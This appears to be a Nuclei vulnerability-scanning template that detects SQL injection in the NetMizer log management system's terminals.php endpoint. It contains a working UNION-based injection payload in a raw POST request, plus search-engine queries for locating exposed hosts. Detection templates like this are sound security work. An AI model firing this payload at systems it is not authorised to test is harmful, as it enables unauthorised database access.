id: netmizer-phonelist-pie-sqli
info:
  name: NetMizer LogManagement System phonelist-pie - SQL Injection
  author: qwtd
  severity: high
  description: |
    SQL Injection vulnerability in the NetMizer log management system phonelist-pie, and the attacker can execute arbitrary SQL commands by passing in the SQL parameter.
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/NetMizer/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fterminals%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"NetMizer"
    fofa-query: title="NetMizer 日志管理系统"
  tags: NetMizer-日志管理系统
  classification:
    cwe-id: CWE-89
http:
  - raw:
      - |
        POST /data/echart/terminals.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: */*
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        Priority: u=0
        Content-Length: 40

        action=phonelist-pie&type=3&device=1 UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x4b486d79695241494a69717451667a6d67487761764e72775a7066514176484f5a47697455596141,0x71766a7171),NULL-- -
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - qqjzqKHmyiRAIJiqtQfzmgHwavNrwZpfQAvHOZGitUYaAqvjqq
      - type: status
        status:
          - 200
